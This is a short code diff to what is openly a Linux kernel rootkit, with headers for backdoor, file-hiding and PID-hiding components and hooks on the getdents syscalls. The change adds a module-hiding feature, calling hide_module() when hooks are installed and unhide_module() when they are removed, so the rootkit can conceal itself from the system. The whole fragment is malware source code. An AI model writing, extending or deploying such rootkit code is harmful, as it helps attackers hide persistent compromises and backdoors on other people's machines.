@@ -14,6 +14,7 @@
 #include "common.h"
 #include "hook.h"
 #include "rootkit.h"
+#include "modhide.h"
 #include "filehide.h"
 #include "backdoor.h"
 #include "hidepid.h"
@@ -62,6 +63,9 @@ init_hooks(void)
     sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
 
+    if (rootkit.hiding_module)
+        hide_module();
+
     if (rootkit.hiding_files)
         hide_files();
 
@@ -79,6 +83,9 @@ init_hooks(void)
 void
 remove_hooks(void)
 {
+    if (rootkit.hiding_module)
+        unhide_module();
+
     if (rootkit.hiding_files)
         unhide_files();
 
